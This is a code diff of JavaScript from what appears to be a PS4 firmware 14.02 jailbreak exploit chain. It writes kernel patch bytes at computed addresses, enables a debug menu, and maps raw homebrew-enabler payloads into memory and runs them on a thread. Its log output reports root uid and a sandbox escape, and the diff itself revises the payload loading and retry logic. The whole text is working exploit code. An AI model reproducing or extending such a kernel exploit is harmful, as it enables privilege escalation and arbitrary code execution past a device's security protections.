-        var d2 = body[j+1] | (body[j+2]<<8) | (body[j+3]<<16) | (body[j+4]<<24);
-        if (d2 >= 0x80000000) d2 -= 0x100000000;
-        var ct2 = fnRva + j + 5 + d2;
-        if (ct2 > 0 && ct2 < TEXT_SIZE && ct2 !== target) {
-          target2 = ct2;
-          say("[dbg] rcmgr check2 at rva 0x" + ct2.toString(16));
-          break;
-        }
-      }
-    }
-
-    var plist = [
-      [target, "b8010000", "rcmgr1a"],
-      [target + 4, "00c3", "rcmgr1b"]
-    ];
-    if (target2 !== null) {
-      plist.push([target2, "b8010000", "rcmgr2a"]);
-      plist.push([target2 + 4, "00c3", "rcmgr2b"]);
-    }
-    k.apply(kbase, plist);
-    say("debug menu enabled -- go to Settings");
-  })();
-
-  /* ---- STEP P: Load payload ---- */
-  say("[p] ---- PAYLOAD LOADING ----");
-  say("[p] patchset: patchset-1402.bin (641 bytes, 14.02 corrected)");
-  say("[p] primary:  encorehen-1402.bin (EncoreHEN 2.0.0, patched Build 184)");
-  say("[p] fallback: hen-1402-source.bin (Scene-Collective ps4-hen build 184)");
-
-  /* First load patchset */
-  say("[p] loading patchset-1402.bin...");
+  /* ---- EXERCISE OFFICIAL 14.02 ps4-hen RAW PAYLOAD, NO BINARY REWRITES ----
+     This is a test candidate. A pthread_create(0) result is NOT HEN initialized.
+     Upstream afterglow's raw-ps4-hen path also runs a userland thread.
+     Remaining kernel patches are still UNVERIFIED for 14.02. */
+  say("[p] Attempting Scene-Collective ps4-hen pre-release-main-184 for 14.02");
   try {
-    const psBlob = await fetchBytes("patchset-1402.bin", "ps");
-    if (psBlob) {
-      say("[p] patchset: " + psBlob.length + " bytes, head=0x" + psBlob[0].toString(16));
-      if (psBlob[0] === 0xb9 && psBlob.length === 641) {
-        say("[p] patchset format: RDMSR shellcode (position-independent) ✓");
-      } else {
-        say("[p] patchset format: unexpected (head=0x" + psBlob[0].toString(16)
-            + " len=" + psBlob.length + ")");
-      }
-    } else {
-      say("[p] patchset-1402.bin not available — GoldHEN may fail to find expected patches");
-    }
+    iface.payload = await loadPayload("hen-1402-source.bin");
   } catch (e) {
-    say("[p] patchset error: " + (e && e.message));
+    say("[p] Error starting HEN-184 thread: " + (e && e.message));
+    iface.payload = false;
   }
-
-  /* Then load main payload */
-  let payloadLoaded = false;
-  const payloads = ["hen-1402-source.bin", "encorehen-1402.bin"];
-  for (let pi = 0; pi < payloads.length && !payloadLoaded; pi++) {
-    say("[p] ---- trying " + payloads[pi] + " ----");
-    try {
-      iface.payload = await loadPayload(payloads[pi]);
-      if (iface.payload) {
-        say("[p] ✓ " + payloads[pi] + " loaded and started");
-        payloadLoaded = true;
-      } else {
-        say("[p] ✗ " + payloads[pi] + " failed to load");
-      }
-    } catch (e) {
-      say("[p] ✗ " + payloads[pi] + " exception: " + (e && e.message));
-      if (e && e.stack) say("[p]   stack: " + e.stack.split("\n").slice(0,3).join(" | "));
-    }
+  if (!iface.payload) {
+    say("[p] HEN-184 thread failed to start; no success reported");
+    return false;
   }
-
-  if (!payloadLoaded) {
-    say("[p] ⚠ WARNING: no payload loaded — jailbreak is active but no HEN/GoldHEN");
-    say("[p] kernel is patched, uid=0, sandbox escaped — but no homebrew enabler");
-  }
-
-  say("");
-  say("╔══════════════════════════════════════╗");
-  say("║   ENCORE 14.02 — CHAIN COMPLETE      ║");
-  say("╠══════════════════════════════════════╣");
-  say("║ Kernel:  " + text(kbase) + " ║");
-  say("║ Patches: " + done + "/" + PATCHES.length + " verified" + (done === PATCHES.length ? " ✓" : " ✗") + "               ║");
-  say("║ UID:     " + sc(S.getuid).i32 + (sc(S.getuid).i32 === 0 ? " (root) ✓" : " ✗") + "                       ║");
-  say("║ Payload: " + (payloadLoaded ? "loaded ✓" : "NONE ✗") + "                      ║");
-  say("║ Handles: " + (iface.defused ? "defused ✓" : "ARMED ⚠") + "                     ║");
-  say("╚══════════════════════════════════════╝");
+  say("[p] HEN-184 thread created; HEN initialization NOT verified");
+  say("  Kernel patch readback: " + done + "/" + PATCHES.length + " (not semantic validation)");
+  say("  THIS IS AN EXPERIMENTAL 14.02 TEST, NOT CONFIRMED SUCCESS");
   return iface;
 }
 
@@ -1830,23 +1454,19 @@ async function loadPayload(url, vorab) {
   const c = host();
   let blob = vorab || null;
   if (blob === null) {
-    say("[p] fetching " + url + "...");
     blob = await fetchBytes(url, "p");
-    if (blob === null) { say("[p] fetch returned null for " + url); return false; }
+    if (blob === null) return false;
   }
 
-  say("[p] " + url + ": " + blob.length + " bytes received");
   if (!blob.length) { say("[p] " + url + " is empty"); return false; }
-  say("[p] header: " + Array.from(blob.slice(0, 8)).map(function(x) {
-    return x.toString(16).padStart(2, "0");
-  }).join(" "));
-
-  if (blob[0] !== 0xe9) {
-    say("[p] " + url + " byte[0]=0x" + blob[0].toString(16) + " — not 0xe9 (jmp rel32)");
-    say("[p] refusing: not a raw payload format");
+  if (url === "hen-1402-source.bin" && blob.length !== 501152) {
+    say("[p] HEN184 wrong length " + blob.length + " (expected 501152), stopping");
     return false;
   }
-  say("[p] " + url + " starts with JMP rel32 ✓ (raw payload format)");
+  if (blob[0] !== 0xe9) {
+    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
+    return false;
+  }
 
   const size = (blob.length + 0x3fff) & ~0x3fff;
   const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
@@ -1882,9 +1502,9 @@ async function loadPayload(url, vorab) {
     }
   }
   
-  /* Source-compiled HEN has correct offsets — no runtime patches needed */
-  say("[p] source-compiled HEN (" + blob.length + " bytes) — no runtime patches needed");
-  say("[p] payload copied and verified, starting thread");
+  // This version does NOT rewrite the official HEN executable in memory.
+  // 0x1068 / 0x1136 / 0x3490 are not safe, generic patch locations.
+  say("[p] Official HEN184 copied byte-for-byte; starting raw-payload thread");
 
   const SLOT_1352 = 0x3cb9c00;
   const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
@@ -1915,14 +1535,14 @@ async function loadPayload(url, vorab) {
 
 /* End of file */
 export async function runAfterglow(ctx, opts) {
-  const max = (opts && opts.tries) || 8;
+  const max = (opts && opts.tries) || 4;
   for (let n = 1; n <= max; n++) {
     const r = await attempt(ctx, opts);
     if (r) return r;
     if (!STATE.retry) return false;
     if (n === max) { say("gave up after " + n + " attempts"); return false; }
-    say("attempt " + n + " of " + max + " fell short -- going again in 2000ms");
-    await new Promise(function (ok) { setTimeout(ok, 2000); });
+    say("attempt " + n + " fell short -- going again");
+    await new Promise(function (ok) { setTimeout(ok, 400); });
   }
   return false;
 }
